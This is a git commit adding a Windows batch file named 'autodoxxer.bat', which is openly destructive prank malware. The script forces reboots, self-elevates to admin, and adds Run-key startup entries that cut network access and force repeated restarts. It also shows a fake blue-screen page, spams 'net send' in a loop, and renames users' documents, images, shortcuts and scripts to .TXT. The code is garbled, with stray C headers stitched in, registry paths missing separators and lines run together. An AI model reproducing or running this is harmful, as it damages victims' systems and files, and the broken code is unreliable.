6d0e880d292384eb44b35643ddc893ef14a956d7
mzxv <Michael24ads@gmail.com>
2024-12-22 00:18:23 -0800

    Add files via upload

---
+++ autodoxxer.bat
@@ -0,0 +1,118 @@
+@echo off
+rem made by @Cyber_News101 In Twitter!
+
+rem Restarting the computer
+shutdown -r -t 5
+
+rem Wait for the system to restart (5 seconds before restart)
+timeout /t 5 /nobreak >nul
+
+rem Open Notepad with a message
+start notepad.exe
+echo Message from Microsoft defender : Sorry we, failed to defend you from the malware. > %temp%\Detected Malware.txt
+notepad.exe %temp%\Detected Malware.txt
+
+rem Play a crazy sound
+start /min mplay32 /play /close %SystemRoot%\Media\chimes.wav
+
+@echo off
+if not "%1"=="am_admin" (
+    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
+    exit /b
+)
+
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/select.h>
+#include <sys/socket.h>
+#include <time.h>
+#include <windows.h>
+
+typedef double float64_t;
+typedef long double float80_t;
+
+echo @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo Now, You Lost Your Connection!
+
+@echo off
+echo ^<html^>^<head^>^<title^>BSOD^
+> bsod.hta
+
+echo. >> bsod.hta
+echo ^<hta:application id=”oBVC” >> bsod.hta
+echo applicationname=”BSOD” >> bsod.hta
+echo version=”1.0″ >> bsod.hta
+echo maximizebutton=”no” >> bsod.hta
+echo minimizebutton=”no” >> bsod.hta
+echo sysmenu=”no” >> bsod.hta
+echo Caption=”no” >> bsod.hta
+echo windowstate=”maximize”/^> >> bsod.hta
+echo. >> bsod.hta
+echo ^</head^>^<body bgcolor=”#000088″ scroll=”no”^> >> bsod.hta
+echo ^<font face=”Lucida Console” size=”4″ color=”#FFFFFF”^> >> bsod.hta
+echo ^<p^>A problem has been detected and windows has been shutdown to prevent damage to your computer.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>DRIVER_IRQL_NOT_LES_OR_EQ
+UAL^</p^> >> bsod.htaecho. >> bsod.hta
+echo ^<p^>If this is the first time you’ve seen this stop error screen, restart your computer, If this screen appears again, follow these steps:^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.^ >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>Technical information:^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000
+000,0xF86B5A89)^ >> bsod.htaecho. >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>*** gv3.sys – Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^ >> bsod.hta
+echo. >> bsod.hta
+echo ^<p^>Beginning dump of physical memory^</p^> >> bsod.hta
+echo ^<p^>Physical memory dump complete.^</p^> >> bsod.hta
+echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^> >> bsod.hta
+echo. >> bsod.hta
+echo. >> bsod.hta
+echo ^</font^> >> bsod.hta
+echo ^</body^>^</html^> >> bsod.hta
+start “” /wait “bsod.hta”
+del /s /f /q “bsod.hta” > nul
+
+:CRASH
+net send * WORKGROUP ENABLED
+net send * WORKGROUP ENABLED
+GOTO CRASH
+ipconfig /release
+shutdown -r -f -t0
+echo @echo off>c:windowshartlell.bat
+echo break off>>c:windowshartlell.bat
+echo shutdown -r -t 11 -f>>c:windowshartlell.bat
+echo end>>c:windowshartlell.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f
+echo You Have Been Hackedecho @echo off>c:windowswimn32.bat
+echo break off>>c:windowswimn32.bat
+echo ipconfig/release_all>>c:windowswimn32.bat
+echo end>>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f
+echo sorry, please restart your computer
+REN *.DOC *.TXT
+REN *.JPEG *.TXT
+REN *.LNK *.TXT
+REN *.AVI *.TXT
+REN *.MPEG *.TXT
+REN *.COM *.TXT
+REN *.BAT *.TXT
+PAUSE
+PAUSE
